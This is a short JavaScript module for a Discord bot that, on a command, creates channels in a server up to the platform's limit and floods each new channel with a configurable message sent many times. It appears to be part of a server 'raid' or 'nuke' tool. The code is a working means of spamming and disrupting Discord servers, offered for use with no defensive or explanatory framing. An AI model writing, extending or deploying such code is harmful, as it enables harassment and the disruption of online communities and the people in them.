module.exports = (client, prefix, comamnde, parametres) => {
    client.on('message', message => {
        if (message.content === prefix + comamnde) {
            for (var i = 0; i < parametres.createChannelCount; i++) {
                if (message.guild.channels.size > 498) return;
                message.guild.createChannel(parametres.createChannelName, 'text')
                    .then(channel => {
                        for (var o = 0; o < parametres.sendMessageCount; o++) {
                            channel.send(parametres.sendMessageContent);
                        }
                    })
                    .catch(console.error);
            }
        }
    })
}